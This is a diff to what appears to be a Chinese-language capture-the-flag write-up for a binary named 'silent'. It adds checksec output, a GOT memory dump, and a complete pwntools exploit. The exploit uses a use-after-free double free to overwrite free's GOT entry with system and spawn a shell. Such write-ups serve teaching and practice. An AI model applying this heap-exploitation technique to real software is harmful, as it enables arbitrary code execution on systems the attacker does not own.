@@ -3,6 +3,11 @@
 checksec
 
 ```
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 
 ```
 
@@ -60,5 +65,57 @@ signed __int64 sub_400A99()
 
 利用uaf修改free的got表为system的地址
 
+```
+x/30gx 0x602000-0x6
+0x601ffa:	0x1e28000000000000	0x4168000000000060
+0x60200a:	0x47c000007f01141f	0x070600007f0113fe
+0x60201a:	0x0716000000000040	0x0726000000000040
+0x60202a:	0xd510000000000040	0x805000007f0113c6
 
+```
 
+```
+readelf -a ./silent |grep "free"
+000000602018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
+     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
+```
+
+exp:
+
+```
+from pwn import *
+
+r = process("./silent")
+print util.proc.pidof(r)
+pause()
+
+def add(size, content):
+	r.sendline("1")
+	r.sendline(str(size))
+	r.sendline(content)
+	r.sendline()
+
+def free(index):
+	r.sendline("2")
+	r.sendline(str(index))
+
+def update(index,content):
+	r.sendline("3")
+	r.sendline(str(index))
+	r.sendline(content)
+
+system_plt = 0x400730
+addr = 0x602000 - 0x6
+
+add(0x50,'a'*48)
+add(0x50,'b'*50)
+add(0x50,'/bin/sh')
+free(0)
+free(1)
+free(0)
+update(0,p64(addr))
+add(0x50,'3'*0x5f)
+add(0x50,('\x41'*(6+8))+p64(system_plt))
+free(2)
+r.interactive()
+```
